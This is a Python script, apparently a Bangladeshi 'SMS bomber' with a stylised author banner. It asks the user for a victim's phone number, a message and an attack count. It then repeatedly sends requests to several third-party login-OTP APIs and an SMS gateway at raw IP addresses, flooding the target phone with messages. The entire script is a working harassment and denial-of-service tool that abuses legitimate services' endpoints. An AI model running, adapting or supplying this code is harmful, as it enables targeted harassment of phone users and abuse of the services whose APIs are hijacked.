import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _______ _    _ _  _____                                         
 |__   __| |  | (_)/ ____|                                        
    | |  | |__| |_| (___                                          
    | |  |  __  | |\___ \                                         
    | |  | |  | | |____) |                                        
   _|_|_ |_|  |_|_|_____/____   __  __                            
  / ____|      / ____|__   __| |  \/  |                           
 | (___  _   _| (___    | | ___| \  / |                           
  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
  ____) | |_| |____) |  | |  __/ |  | |                           
 |_____/ \__, |_____/___|_|\___|_|  |_|                           
  / ____| __/ |     |__   __|                                     
 | |     |___/___  __ _| | ___  _ __                              
 | |    | '__/ _ \/ _` | |/ _ \| '__|                             
 | |____| | |  __/ (_| | | (_) | |                                
  \_____|_|  \___|\__,_|_|\___/|_|                                
 |  _ \                                                           
 | |_) |_   _                                                     
 |  _ <| | | |                                                    
 | |_) | |_| |                                                    
 |____/ \__, |                                                    
         __/ |                                                    
   __  _|___/ _____         _____ _    _       _  ___ ____   __   
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
  \_\                                                        /_/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print ("\033[32m")

print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")


print ("""
          
                       
   ╔═════════════════════════════════╗
   ║ AuTHor   : SHaKiiB ツ           ║
   ║ FaCeBooK : iTzSHaKiiB           ║
   ║ GitHuB   : iTzSHaKiB            ║
   ╚═════════════════════════════════╝
       
 
  
  
""")

number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))

sms  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar SMS TyPE kOrUN: ")) 

amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number

url2 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"]="application/json"

data2 = """{
  \"direct_login\": true,
  \"user\": {
    \"resend\": false,
    \"login\": \"88"""+number+"""\",
    \"type\": {
      \"register\": true
    }
  }
}"""

url5 = "http://27.131.15.12/sdpdcg/SendSMS.aspx?sMSISDN=88"+number+"&sMsg="+sms+"&sShortcode=21200"

url7 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url8 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

for i in range(amount):
	try:
		
		resp1 = requests.post(url1, headers=headers1, data=data1)
		
		resp2 = requests.post(url2, headers=headers2, data=data2)
		
		resp5 = requests.get(url5)
		
		resp7 = requests.get(url7)
		
		resp8 = requests.get(url8)
		
		print(str (i+1)+" aTTack SenT \n")
		
	except:
		print ("TuMar PHonE a NeT Nai....pHonE neTwOrk a RakHo...")

